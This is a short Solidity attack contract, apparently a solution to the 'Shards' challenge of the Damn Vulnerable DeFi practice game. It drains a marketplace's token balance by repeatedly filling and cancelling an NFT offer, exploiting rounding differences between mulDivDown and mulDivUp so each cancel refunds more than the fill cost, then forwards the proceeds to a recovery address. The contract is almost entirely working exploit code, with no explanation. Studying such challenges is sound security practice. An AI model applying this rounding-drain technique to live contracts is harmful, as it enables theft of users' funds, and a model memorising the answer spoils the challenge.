// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;
import {FixedPointMathLib} from "solmate/utils/FixedPointMathLib.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {ShardsNFTMarketplace} from "../../src/shards/ShardsNFTMarketplace.sol";

contract ShardsAttacker {
    using FixedPointMathLib for uint256;
    using FixedPointMathLib for uint112;
    uint256 constant STAKING_REWARDS = 100_000e18;
    uint256 constant NFT_SUPPLY = 50;
    uint256 constant SELLER_NFT_BALANCE = 1;
    uint256 constant SELLER_DVT_BALANCE = 75e19;
    uint256 constant STAKING_RATE = 1e18;
    uint256 constant MARKETPLACE_INITIAL_RATE = 75e15;
    uint112 constant NFT_OFFER_PRICE = 1_000_000e6;
    uint112 constant NFT_OFFER_SHARDS = 10_000_000e18;

    constructor(){

    }
    function attack(DamnValuableToken token, ShardsNFTMarketplace marketplace, address recovery) public {
        uint256 fillOfferPriceInDVT = NFT_OFFER_PRICE.mulDivDown(MARKETPLACE_INITIAL_RATE, 1e6);

        while(true){
            uint256 playerBalance = token.balanceOf(address(this));
            uint256 want = (playerBalance + 1).mulDivDown(NFT_OFFER_SHARDS, fillOfferPriceInDVT);
            uint256 loss = want.mulDivDown(fillOfferPriceInDVT, NFT_OFFER_SHARDS);
            uint256 earn = want.mulDivUp(MARKETPLACE_INITIAL_RATE, 1e6);

            uint256 marketBalance = token.balanceOf(address(marketplace));
            bool isBreak;
            if (marketBalance < earn){
                want = FixedPointMathLib.mulDivDown(marketBalance, 1e6, MARKETPLACE_INITIAL_RATE);
                loss = want.mulDivDown(fillOfferPriceInDVT, NFT_OFFER_SHARDS);
                earn = FixedPointMathLib.mulDivUp(want, MARKETPLACE_INITIAL_RATE, 1e6);
                isBreak = true;
            }

            token.approve(address(marketplace), loss);
            uint256 purchaseIndex = marketplace.fill(1, want);
            marketplace.cancel(1, purchaseIndex);
            if (isBreak){
                break;
            }
        }
        token.transfer(recovery, token.balanceOf(address(this)));
    }
}
